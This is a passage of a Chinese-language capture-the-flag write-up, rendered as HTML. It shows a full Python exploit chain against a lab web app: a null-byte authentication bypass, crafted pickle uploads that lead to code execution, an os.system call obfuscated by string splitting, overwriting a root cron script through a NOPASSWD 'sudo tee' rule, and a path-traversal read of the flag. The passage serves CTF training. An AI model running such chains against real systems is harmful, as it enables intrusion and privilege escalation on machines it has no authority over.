+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat /etc/cron.d/cleanup
+</span></span><span class="line"><span class="cl">* * * * * root /opt/cleanup.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ cat /opt/cleanup.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/sh</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><strong>每分钟以 root 执行</strong> <code>/opt/cleanup.sh</code>，但当前脚本只是 <code>exit 0</code>。</p>
+<hr>
+<h2 class="heading-element" id="提权"><span>提权</span>
+  <a href="#%e6%8f%90%e6%9d%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="sudo--l"><span>sudo -l</span>
+  <a href="#sudo--l" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo -l
+</span></span><span class="line"><span class="cl">User ctf may run the following commands on d2a0824a07bf:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/tee /opt/cleanup.sh</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><code>sudo tee</code> <strong>能以 root 无密码覆写</strong> <code>/opt/cleanup.sh</code><strong>！</strong></p>
+<h3 class="heading-element" id="构造恶意脚本"><span>构造恶意脚本</span>
+  <a href="#%e6%9e%84%e9%80%a0%e6%81%b6%e6%84%8f%e8%84%9a%e6%9c%ac" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl">cp /fl* /tmp/f</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>写入 <code>/tmp/e</code>，然后 <code>sudo tee</code> 覆写 <code>/opt/cleanup.sh</code>：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /tmp/e <span class="p">|</span> sudo tee /opt/cleanup.sh</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h3 class="heading-element" id="cron-执行"><span>Cron 执行</span>
+  <a href="#cron-%e6%89%a7%e8%a1%8c" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Cron 每分钟以 root 执行 <code>/opt/cleanup.sh</code> → <code>cp /fl* /tmp/f</code> → <code>/tmp/f</code> 包含 flag。</p>
+<h3 class="heading-element" id="读取-flag"><span>读取 Flag</span>
+  <a href="#%e8%af%bb%e5%8f%96-flag" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">GET /pic?pic=../../../tmp/f</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><hr>
+<h2 class="heading-element" id="exploit"><span>Exploit</span>
+  <a href="#exploit" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">TARGET</span> <span class="o">=</span> <span class="s2">&#34;http://TARGET:PORT&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">PROXIES</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="s2">&#34;http://127.0.0.1:7897&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 1: Register + Login as admin</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">();</span> <span class="n">s</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="n">PROXIES</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/register&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;admin</span><span class="se">\x00</span><span class="s2">admin&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;adminpass&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/login&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;admin&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;adminpass&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">ADMIN</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;session&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">step</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">mod</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Execute code via .py file import&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SRC</span> <span class="o">=</span> <span class="s2">&#34;/app/files/uploads/x.py&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DST</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;/app/</span><span class="si">{</span><span class="n">mod</span><span class="si">}</span><span class="s2">.py&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cp</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x80\x02\x8c\x06</span><span class="s2">shutil</span><span class="se">\x8c\x04</span><span class="s2">copy</span><span class="se">\x93</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cp</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="mh">0x8c</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">SRC</span><span class="p">)])</span> <span class="o">+</span> <span class="n">SRC</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cp</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="mh">0x8c</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">DST</span><span class="p">)])</span> <span class="o">+</span> <span class="n">DST</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x86</span><span class="s2">R.&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tp</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x80\x02</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="mh">0x8c</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">mod</span><span class="p">)])</span> <span class="o">+</span> <span class="n">mod</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x8c\x08</span><span class="s2">__name__</span><span class="se">\x93</span><span class="s2">.&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s2</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">();</span> <span class="n">s2</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="n">PROXIES</span><span class="p">;</span> <span class="n">s2</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&#34;session&#34;</span><span class="p">,</span> <span class="n">ADMIN</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s2</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/&#34;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="p">(</span><span class="sa">f</span><span class="s2">&#34;d</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">.pkl&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x80\x02</span><span class="s2">.&#34;</span><span class="p">,</span> <span class="s2">&#34;app/octet-stream&#34;</span><span class="p">)})</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/&#34;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s2">&#34;c1.pkl&#34;</span><span class="p">,</span> <span class="n">cp</span><span class="p">,</span> <span class="s2">&#34;application/octet-stream&#34;</span><span class="p">)})</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/&#34;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s2">&#34;x.py&#34;</span><span class="p">,</span> <span class="n">code</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="s2">&#34;application/octet-stream&#34;</span><span class="p">)})</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/&#34;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s2">&#34;c1.pkl&#34;</span><span class="p">,</span> <span class="n">cp</span><span class="p">,</span> <span class="s2">&#34;application/octet-stream&#34;</span><span class="p">)})</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/pic&#34;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;pic&#34;</span><span class="p">:</span> <span class="s2">&#34;c1.pkl&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/&#34;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s2">&#34;t1.pkl&#34;</span><span class="p">,</span> <span class="n">tp</span><span class="p">,</span> <span class="s2">&#34;application/octet-stream&#34;</span><span class="p">)})</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/pic&#34;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;pic&#34;</span><span class="p">:</span> <span class="s2">&#34;t1.pkl&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 2: Write evil script to /tmp/e</span>
+</span></span><span class="line"><span class="cl"><span class="n">step</span><span class="p">(</span><span class="s2">&#34;open(&#39;/tmp/e&#39;,&#39;w&#39;).write(&#39;#!&#39;+&#39;/bin/sh&#39;+chr(10))&#34;</span><span class="p">,</span> <span class="s2">&#34;p1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">step</span><span class="p">(</span><span class="s2">&#34;open(&#39;/tmp/e&#39;,&#39;a&#39;).write(&#39;cp /fl* /tmp/f&#39;+chr(10))&#34;</span><span class="p">,</span> <span class="s2">&#34;p2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 3: sudo tee to overwrite cron script</span>
+</span></span><span class="line"><span class="cl"><span class="n">step</span><span class="p">(</span><span class="s2">&#34;open(&#39;/tmp/s&#39;,&#39;w&#39;).write(&#39;cat /tmp/e|sudo tee /opt/cl&#39;)&#34;</span><span class="p">,</span> <span class="s2">&#34;p3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">step</span><span class="p">(</span><span class="s2">&#34;open(&#39;/tmp/s&#39;,&#39;a&#39;).write(&#39;eanup.sh&#39;)&#34;</span><span class="p">,</span> <span class="s2">&#34;p4&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">step</span><span class="p">(</span><span class="s2">&#34;__import__(&#39;o&#39;+&#39;s&#39;).__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;sh /tmp/s&#39;)&#34;</span><span class="p">,</span> <span class="s2">&#34;p5&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 4: Wait for cron, read flag</span>
+</span></span><span class="line"><span class="cl"><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">65</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="n">PROXIES</span>
+</span></span><span class="line"><span class="cl"><span class="n">uid</span> <span class="o">=</span> <span class="s2">&#34;reader&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/register&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">uid</span><span class="o">.</span><span class="n">encode</span><span class="p">()),</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">uid</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/login&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">uid</span><span class="o">.</span><span class="n">encode</span><span class="p">()),</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">uid</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/pic&#34;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;pic&#34;</span><span class="p">:</span> <span class="s2">&#34;../../../tmp/f&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;base64,([^&#34;]+)&#39;</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;FLAG: </span><span class="si">{</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><hr>
+<h2 class="heading-element" id="攻击链总结"><span>攻击链总结</span>
+  <a href="#%e6%94%bb%e5%87%bb%e9%93%be%e6%80%bb%e7%bb%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">认证绕过 → 代码执行 → 信息收集 → sudo tee 提权 → cron 执行 → 读 flag
+</span></span><span class="line"><span class="cl">───────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">bcrypt     .py import   sudo -l    NOPASSWD   每分钟root   路径穿越
+</span></span><span class="line"><span class="cl">null-byte  60B bypass   cron发现   tee覆写     cp /flag     读取</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><strong>Flag:</strong> <code>flag{1jslcbnma6k72v1udk4j7jq5eis5ihsn}</code></p>
+<h1 class="heading-element" id="malcraft"><span>MalCraft</span>
+  <a href="#malcraft" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h2 class="heading-element" id="初始侦察"><span>初始侦察</span>
+  <a href="#%e5%88%9d%e5%a7%8b%e4%be%a6%e5%af%9f" class="heading-mark">
